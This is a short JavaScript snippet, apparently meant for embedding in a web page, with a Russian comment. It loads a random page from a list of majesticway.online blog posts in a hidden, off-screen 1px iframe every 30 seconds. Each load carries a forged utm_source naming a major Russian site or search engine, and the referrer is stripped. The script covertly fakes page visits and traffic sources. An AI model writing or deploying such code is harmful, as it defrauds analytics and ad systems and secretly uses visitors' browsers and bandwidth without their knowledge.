  const urls = [
    "https://www.majesticway.online/2024/08/python.html",
    "https://www.majesticway.online/2024/08/10-javascript.html",
    "https://www.majesticway.online/2024/08/2024.html",
    "https://www.majesticway.online/2024/08/blog-post.html",
    "https://www.majesticway.online/2024/08/sql.html",
    "https://www.majesticway.online/2024/08/blog-post_20.html",
    "https://www.majesticway.online/2024/08/blog-post_52.html",
    "https://www.majesticway.online/2024/08/blog-post_97.html",
    "https://www.majesticway.online/2024/08/ai.html",
    "https://www.majesticway.online/2024/08/5-2024.html"
  ];

  const sources = [
    "utro.ru", "mail.rambler.ru", "vz.ru", "ozon.ru", "rambler.ru", "pikabu.ru",
    "rsport.ria.ru", "radiosputnik.ria.ru", "kp.ru", "lenta.ru", "avito.ru",
    "drom.ru", "habr.com", "news.mail.ru", "realty.ria.ru", "rbc.ru",
    "aliexpress.ru", "otvet.mail.ru", "gazeta.ru", "smi2.ru", "kommersant.ru",
    "mk.ru", "ria.ru", "yandex", "google", "bing", "vk", "fotostrana", "ok", "zen"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const source = sources[Math.floor(Math.random() * sources.length)];
    const fullUrl = page + "?utm_source=" + encodeURIComponent(source);

    const iframe = document.createElement("iframe");
    iframe.src = fullUrl;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  // Загружаем iframe сразу и повторяем каждые 30 сек
  loadIframe();
  setInterval(loadIframe, 30000);
